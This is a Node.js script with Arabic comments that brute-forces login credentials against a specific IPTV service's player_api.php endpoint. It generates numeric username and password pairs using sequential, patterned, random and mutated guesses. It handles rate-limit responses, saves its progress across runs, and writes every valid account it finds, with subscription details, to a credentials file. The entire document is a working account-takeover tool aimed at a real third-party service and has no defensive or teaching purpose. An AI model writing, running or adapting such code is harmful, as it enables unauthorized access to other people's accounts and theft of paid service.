const fs = require('fs');
const path = require('path');

// تكوينات البحث الشاملة
const CONFIG = {
    baseUrl: 'http://orien.live/player_api.php',
    maxTimeMinutes: parseInt(process.env.MAX_TIME_MINUTES || '10'),
    digitLength: 14,
    // استراتيجيات البحث المختلفة
    strategies: {
        sequential: true,
        pattern_based: true,
        smart_random: true,
        brute_force: true
    },
    ranges: {
        minStart: '10000000000000',
        maxStart: '99999999999999',
        commonPrefixes: [
            '1630', '1631', '1632', '1633', '1634', '1635', '1636', '1637', '1638', '1639',
            '1640', '1641', '1642', '1643', '1644', '1645', '1646', '1647', '1648', '1649',
            '1650', '1651', '1652', '1653', '1654', '1655', '1656', '1657', '1658', '1659',
            '1660', '1661', '1662', '1663', '1664', '1665', '1666', '1667', '1668', '1669',
            '1670', '1671', '1672', '1673', '1674', '1675', '1676', '1677', '1678', '1679',
            '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019',
            '2020', '2021', '2022', '2023', '2024', '2025', '2026'
        ]
    }
};

// مولد الأرقام الشامل
class ComprehensiveNumberGenerator {
    constructor() {
        this.generatedNumbers = new Set();
        this.currentStrategy = 'sequential';
        this.strategyIndex = 0;
        this.lastSuccessPattern = null;
        this.strategies = ['sequential', 'pattern_based', 'smart_random', 'brute_force'];
        this.sequentialCounter = BigInt(CONFIG.ranges.minStart);
        this.maxSequential = BigInt(CONFIG.ranges.maxStart);
        this.attemptsInStrategy = 0;
        this.maxAttemptsPerStrategy = 500;
    }

    // تحميل التقدم السابق
    loadProgress() {
        try {
            const progressFile = path.join(process.cwd(), 'progress.json');
            const progressDataFile = path.join(process.cwd(), 'progress_data', 'progress.json');
            
            let progressFileToLoad = null;
            if (fs.existsSync(progressFile)) {
                progressFileToLoad = progressFile;
            } else if (fs.existsSync(progressDataFile)) {
                progressFileToLoad = progressDataFile;
            }
            
            if (progressFileToLoad) {
                const progress = JSON.parse(fs.readFileSync(progressFileToLoad, 'utf8'));
                
                if (progress.triedNumbers && Array.isArray(progress.triedNumbers)) {
                    progress.triedNumbers.forEach(num => this.generatedNumbers.add(num));
                    console.log(`📥 تم تحميل ${progress.triedNumbers.length} رقم مجرب سابقاً`);
                }
                
                if (progress.lastCounter) {
                    this.sequentialCounter = BigInt(progress.lastCounter);
                    console.log(`📍 استئناف من الرقم: ${this.sequentialCounter}`);
                }
                
                if (progress.lastStrategy) {
                    this.currentStrategy = progress.lastStrategy;
                    console.log(`📊 الاستراتيجية السابقة: ${this.currentStrategy}`);
                }
            }
        } catch (error) {
            console.log('⚠️ لا يوجد تقدم سابق أو خطأ في التحميل');
        }
    }

    // حفظ التقدم
    saveProgress(attempts) {
        try {
            const progress = {
                lastAttempt: attempts,
                timestamp: new Date().toISOString(),
                lastCounter: this.sequentialCounter.toString(),
                lastStrategy: this.currentStrategy,
                triedNumbers: Array.from(this.generatedNumbers).slice(-5000)
            };
            
            const progressFile = path.join(process.cwd(), 'progress.json');
            fs.writeFileSync(progressFile, JSON.stringify(progress, null, 2));
            
            // أيضاً حفظ في مجلد progress_data
            const progressDataDir = path.join(process.cwd(), 'progress_data');
            if (!fs.existsSync(progressDataDir)) {
                fs.mkdirSync(progressDataDir, { recursive: true });
            }
            const progressDataFile = path.join(progressDataDir, 'progress.json');
            fs.writeFileSync(progressDataFile, JSON.stringify(progress, null, 2));
        } catch (error) {
            console.log(`⚠️ خطأ في حفظ التقدم: ${error.message}`);
        }
    }

    // توليد الرقم التالي
    generateNextNumber() {
        let number;
        let attempts = 0;
        
        if (this.attemptsInStrategy >= this.maxAttemptsPerStrategy) {
            this.switchStrategy();
        }
        
        do {
            switch (this.currentStrategy) {
                case 'sequential':
                    number = this.generateSequential();
                    break;
                case 'pattern_based':
                    number = this.generatePatternBased();
                    break;
                case 'smart_random':
                    number = this.generateSmartRandom();
                    break;
                case 'brute_force':
                    number = this.generateBruteForce();
                    break;
                default:
                    number = this.generateSmartRandom();
            }
            attempts++;
        } while (this.generatedNumbers.has(number) && attempts < 20);
        
        this.generatedNumbers.add(number);
        this.attemptsInStrategy++;
        return number;
    }

    generateSequential() {
        const numStr = this.sequentialCounter.toString().padStart(14, '0');
        this.sequentialCounter += BigInt(1);
        
        if (this.sequentialCounter > this.maxSequential) {
            this.sequentialCounter = BigInt(CONFIG.ranges.minStart);
        }
        
        return numStr;
    }

    generatePatternBased() {
        const prefix = CONFIG.ranges.commonPrefixes[
            Math.floor(Math.random() * CONFIG.ranges.commonPrefixes.length)
        ];
        
        const remainingLength = 14 - prefix.length;
        let suffix = '';
        
        const patterns = [
            '0000000000', '1111111111', '2222222222', '3333333333', '4444444444',
            '5555555555', '6666666666', '7777777777', '8888888888', '9999999999',
            '0123456789', '9876543210', '1122334455', '5544332211', '1234512345',
            '5432154321', '0000111122', '1111222233', '2222333344', '3333444455'
        ];
        
        if (Math.random() < 0.3) {
            suffix = patterns[Math.floor(Math.random() * patterns.length)]
                .slice(0, remainingLength);
        } else {
            suffix = this.generateOrganizedDigits(remainingLength);
        }
        
        return prefix + suffix;
    }

    generateOrganizedDigits(length) {
        let result = '';
        let lastDigit = -1;
        
        for (let i = 0; i < length; i++) {
            let digit;
            if (i > 0 && Math.random() < 0.3) {
                digit = lastDigit;
            } else {
                const weights = [0.15, 0.15, 0.15, 0.15, 0.15, 0.15, 0.1, 0.1, 0.1, 0.1];
                digit = this.weightedRandom(weights);
            }
            result += digit;
            lastDigit = digit;
        }
        
        return result;
    }

    generateSmartRandom() {
        if (this.lastSuccessPattern && Math.random() < 0.5) {
            return this.mutatePattern(this.lastSuccessPattern);
        }
        
        let number = '';
        const firstDigit = Math.random() < 0.5 ? '1' : '2';
        number += firstDigit;
        
        for (let i = 1; i < 14; i++) {
            if (i % 4 === 0 && Math.random() < 0.3) {
                number += '0';
            } else {
                number += Math.floor(Math.random() * 10);
            }
        }
        
        return number;
    }

    generateBruteForce() {
        const baseNumber = this.sequentialCounter.toString().padStart(14, '0');
        this.sequentialCounter += BigInt(7);
        
        const numArray = baseNumber.split('');
        for (let i = 0; i < 3; i++) {
            const pos = Math.floor(Math.random() * 14);
            numArray[pos] = Math.floor(Math.random() * 10).toString();
        }
        
        return numArray.join('');
    }

    mutatePattern(pattern) {
        const numArray = pattern.split('');
        const mutations = Math.floor(Math.random() * 4) + 1;
        
        for (let i = 0; i < mutations; i++) {
            const pos = Math.floor(Math.random() * 14);
            if (Math.random() < 0.5) {
                numArray[pos] = (parseInt(numArray[pos]) + 1) % 10;
            } else {
                numArray[pos] = Math.floor(Math.random() * 10).toString();
            }
        }
        
        return numArray.join('');
    }

    weightedRandom(weights) {
        const total = weights.reduce((a, b) => a + b, 0);
        let random = Math.random() * total;
        
        for (let i = 0; i < weights.length; i++) {
            random -= weights[i];
            if (random <= 0) return i;
        }
        
        return Math.floor(Math.random() * 10);
    }

    switchStrategy() {
        this.strategyIndex = (this.strategyIndex + 1) % this.strategies.length;
        this.currentStrategy = this.strategies[this.strategyIndex];
        this.attemptsInStrategy = 0;
        console.log(`🔄 تبديل الاستراتيجية إلى: ${this.currentStrategy}`);
    }

    recordSuccess(pattern) {
        this.lastSuccessPattern = pattern;
        this.attemptsInStrategy = 0;
    }
}

// فحص تسجيل الدخول
async function tryLogin(username, password) {
    const url = `${CONFIG.baseUrl}?username=${username}&password=${password}`;
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000);
        
        const response = await fetch(url, {
            signal: controller.signal,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            }
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            if (response.status === 429) {
                return { success: false, rateLimited: true };
            }
            return { success: false };
        }
        
        const data = await response.json();
        
        if (data.user_info && data.user_info.auth === 1) {
            return {
                success: true,
                data: data,
                username: username,
                password: password
            };
        }
        
        return { success: false };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// حفظ النتائج
function saveResults(results) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `found-credentials-${timestamp}.json`;
    const filepath = path.join(process.cwd(), filename);
    
    fs.writeFileSync(filepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ النتائج في: ${filename}`);
    
    const stableFilepath = path.join(process.cwd(), 'found-credentials.json');
    fs.writeFileSync(stableFilepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ نسخة في: found-credentials.json`);
}

// تحميل النتائج السابقة
function loadPreviousResults() {
    try {
        const filepath = path.join(process.cwd(), 'found-credentials.json');
        if (fs.existsSync(filepath)) {
            const data = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            return Array.isArray(data) ? data : [];
        }
    } catch (error) {
        console.log('⚠️ لا توجد نتائج سابقة');
    }
    return [];
}

// الدالة الرئيسية
async function main() {
    console.log('🚀 بدء جولة جديدة من البحث الشامل...');
    console.log(`⏱️  الحد الأقصى للوقت: ${CONFIG.maxTimeMinutes} دقائق`);
    console.log(`🔢 طول الأرقام: ${CONFIG.digitLength} رقم`);
    console.log(`📊 الوقت الحالي: ${new Date().toISOString()}\n`);
    
    const generator = new ComprehensiveNumberGenerator();
    generator.loadProgress(); // تحميل التقدم السابق
    
    const startTime = Date.now();
    const maxTimeMs = CONFIG.maxTimeMinutes * 60 * 1000;
    
    let attempts = 0;
    let successfulLogins = loadPreviousResults();
    let rateLimitCount = 0;
    let consecutiveTimeouts = 0;
    
    while (Date.now() - startTime < maxTimeMs) {
        attempts++;
        
        // توليد زوج من الأرقام
        const username = generator.generateNextNumber();
        const password = generator.generateNextNumber();
        
        // عرض التقدم
        if (attempts % 10 === 0 || attempts === 1) {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            console.log(`\n🔍 المحاولة #${attempts} | ⏱️ ${elapsed}ث | 📊 ${generator.currentStrategy}`);
            console.log(`   Username: ${username}`);
            console.log(`   Password: ${password}`);
        }
        
        // محاولة تسجيل الدخول
        const result = await tryLogin(username, password);
        
        if (result.success) {
            console.log('\n✅✅✅ تم العثور على بيانات اعتماد صالحة! ✅✅✅');
            console.log(`   👤 Username: ${username}`);
            console.log(`   🔑 Password: ${password}`);
            console.log(`   📊 Status: ${result.data.user_info.status}`);
            console.log(`   📅 Expiration: ${new Date(parseInt(result.data.user_info.exp_date) * 1000).toLocaleDateString()}\n`);
            
            successfulLogins.push({
                username: username,
                password: password,
                user_info: result.data.user_info,
                server_info: result.data.server_info,
                found_at: new Date().toISOString(),
                attempts: attempts
            });
            
            generator.recordSuccess(username);
            saveResults(successfulLogins);
            
            if (successfulLogins.length >= 10) {
                console.log('🎉🎉🎉 تم العثور على 10 حسابات ناجحة!');
                break;
            }
        } else if (result.rateLimited) {
            rateLimitCount++;
            console.log(`⚠️ تم تقييد المعدل (429). الانتظار...`);
            await new Promise(resolve => setTimeout(resolve, 10000));
        } else if (result.error) {
            consecutiveTimeouts++;
            if (consecutiveTimeouts >= 5) {
                generator.switchStrategy();
                consecutiveTimeouts = 0;
            }
        } else {
            consecutiveTimeouts = 0;
        }
        
        // تأخير ديناميكي
        let delay = 50;
        if (rateLimitCount > 0) {
            delay = 5000;
        }
        
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // حفظ التقدم كل 200 محاولة
        if (attempts % 200 === 0) {
            generator.saveProgress(attempts);
            console.log(`💾 تم حفظ التقدم في المحاولة ${attempts}`);
        }
    }
    
    // حفظ التقدم النهائي
    generator.saveProgress(attempts);
    
    // النتائج النهائية
    console.log('\n📊 ======== ملخص الجولة ========');
    console.log(`   ⏱️  الوقت المستغرق: ${Math.floor((Date.now() - startTime) / 1000)} ثانية`);
    console.log(`   🔢 إجمالي المحاولات: ${attempts}`);
    console.log(`   ✅ الحسابات الناجحة: ${successfulLogins.length}`);
    console.log(`   📅 تاريخ الجولة: ${new Date().toISOString()}`);
    
    if (successfulLogins.length > 0) {
        saveResults(successfulLogins);
    }
    
    console.log('\n🏁 انتهت الجولة. سيبدأ التشغيل التالي خلال 10 دقائق.');
    process.exit(0);
}

// تشغيل البرنامج
main().catch(error => {
    console.error('❌ خطأ غير متوقع:', error);
    process.exit(1);
});
